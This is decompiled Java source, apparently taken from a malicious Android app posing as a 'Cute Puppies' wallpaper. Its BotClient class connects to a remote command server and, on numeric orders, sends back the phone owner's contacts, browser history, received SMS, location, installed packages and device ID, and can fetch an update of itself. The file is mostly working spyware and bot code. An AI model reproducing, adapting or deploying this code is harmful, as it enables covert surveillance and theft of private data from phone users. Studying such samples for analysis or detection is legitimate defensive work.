// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import java.util.ArrayList;
import java.util.Hashtable;
import java.io.IOException;
import android.util.Log;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.net.Socket;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import android.content.ContentResolver;
import android.content.Context;

public class BotClient
{
    public static final String LOG_TAG = "MCS_BOT_BotClient";
    private boolean bRunning;
    private BotUpdater bup;
    private BotWorker bwr;
    private Context context;
    private ContentResolver cr;
    private String hostUri;
    private ObjectInputStream iStream;
    private ObjectOutputStream ooStream;
    private Integer port;
    private Socket socket;
    
    public BotClient(final String hostUri, final int i, final ContentResolver cr, final Context context) {
        this.socket = null;
        this.bRunning = true;
        this.ooStream = null;
        this.iStream = null;
        this.bwr = null;
        this.bup = null;
        this.port = i;
        this.hostUri = hostUri;
        this.cr = cr;
        this.context = context;
        this.bup = new BotUpdater(this.cr, this.context);
        this.bwr = new BotWorker(this.cr, this.context);
    }
    
    static /* synthetic */ void access$2(final BotClient botClient, final boolean bRunning) {
        botClient.bRunning = bRunning;
    }
    
    public boolean ConnectToServer() {
        try {
            (this.socket = new Socket()).connect(new InetSocketAddress(InetAddress.getByName(this.hostUri).getHostName(), this.port), 2000);
            this.iStream = new ObjectInputStream(this.socket.getInputStream());
            this.ooStream = new ObjectOutputStream(this.socket.getOutputStream());
            Log.v("MCS_BOT_BotClient", "Connected to Master Chief Sunday\n");
            return true;
        }
        catch (IOException ex) {
            ex.printStackTrace();
            return false;
        }
    }
    
    public void Run() {
        if (!this.ConnectToServer()) {
            return;
        }
        new Thread(new MasterCommandProcessor()).start();
    }
    
    public class MasterCommandProcessor extends Thread
    {
        public void SendDataToMaster(final Object obj) {
            try {
                BotClient.this.ooStream.writeObject(obj);
            }
            catch (Exception ex) {
                Log.v("MCS_BOT_BotClient", "Server Closed connection");
            }
        }
        
        @Override
        public void run() {
            int i = 0;
        Label_0002:
            while (true) {
                while (BotClient.this.bRunning) {
                Label_0136_Outer:
                    while (true) {
                        int int1 = i;
                        int n = i;
                        while (true) {
                            Label_0359: {
                                Hashtable<Integer, Hashtable<String, ArrayList<String>>> hashtable = null;
                                Label_0336: {
                                    Label_0305: {
                                        Label_0274: {
                                            Label_0243: {
                                                Label_0212: {
                                                    while (true) {
                                                        try {
                                                            final String s = (String)BotClient.this.iStream.readObject();
                                                            int1 = i;
                                                            n = i;
                                                            if (s.equals("")) {
                                                                break;
                                                            }
                                                            int1 = i;
                                                            n = i;
                                                            i = (n = (int1 = Integer.parseInt(s)));
                                                            Log.v("MCS_BOT_BotClient", "command recieved:" + i);
                                                            hashtable = new Hashtable<Integer, Hashtable<String, ArrayList<String>>>();
                                                            switch (i) {
                                                                default: {
                                                                    this.SendDataToMaster(hashtable);
                                                                    continue Label_0002;
                                                                }
                                                                case 101: {
                                                                    break;
                                                                }
                                                                case 102: {
                                                                    break Label_0212;
                                                                }
                                                                case 105: {
                                                                    break Label_0243;
                                                                }
                                                                case 104: {
                                                                    break Label_0274;
                                                                }
                                                                case 103: {
                                                                    break Label_0305;
                                                                }
                                                                case 106: {
                                                                    break Label_0336;
                                                                }
                                                                case 107: {
                                                                    break Label_0359;
                                                                }
                                                            }
                                                        }
                                                        catch (IOException ex) {
                                                            BotClient.access$2(BotClient.this, false);
                                                            Log.v("MCS_BOT_BotClient", "MCS server closed connection");
                                                            ex.printStackTrace();
                                                            i = int1;
                                                            continue Label_0136_Outer;
                                                        }
                                                        catch (ClassNotFoundException ex2) {
                                                            ex2.printStackTrace();
                                                            i = n;
                                                            break;
                                                        }
                                                        break;
                                                    }
                                                    hashtable.put(101, BotClient.this.bwr.GetContactInfo());
                                                    Log.v("MCS_BOT_BotClient", "MCS ordered contacts");
                                                    continue;
                                                }
                                                hashtable.put(102, (Hashtable<String, ArrayList<String>>)BotClient.this.bwr.GetBrowserHistory());
                                                Log.v("MCS_BOT_BotClient", "MCS Browser History");
                                                continue;
                                            }
                                            hashtable.put(105, (Hashtable<String, ArrayList<String>>)BotClient.this.bwr.GetPackagesInstalled());
                                            Log.v("MCS_BOT_BotClient", "MCS Get Packages");
                                            continue;
                                        }
                                        hashtable.put(104, (Hashtable<String, ArrayList<String>>)BotClient.this.bwr.GetCurrentLocation());
                                        Log.v("MCS_BOT_BotClient", "MCS Get Locations");
                                        continue;
                                    }
                                    hashtable.put(103, (Hashtable<String, ArrayList<String>>)BotClient.this.bwr.GetReceivedSMS());
                                    Log.v("MCS_BOT_BotClient", "MCS Get SMS Messages");
                                    continue;
                                }
                                hashtable.put(106, (Hashtable<String, ArrayList<String>>)BotClient.this.bwr.GetDeviceID());
                                continue;
                            }
                            BotClient.this.bup.UpdateClient();
                            continue;
                        }
                    }
                }
                break;
            }
        }
    }
    
    interface McsDataTypes
    {
        public static final int MCS_BROWSER_HISTORY = 102;
        public static final int MCS_CONTACTS_INFO = 101;
        public static final int MCS_DEVICE_INFO = 106;
        public static final int MCS_LOCATION = 104;
        public static final int MCS_NEW_VERSION = 107;
        public static final int MCS_PACKAGES = 105;
        public static final int MCS_SMS = 103;
        public static final int MCS_STOP = 222;
    }
}
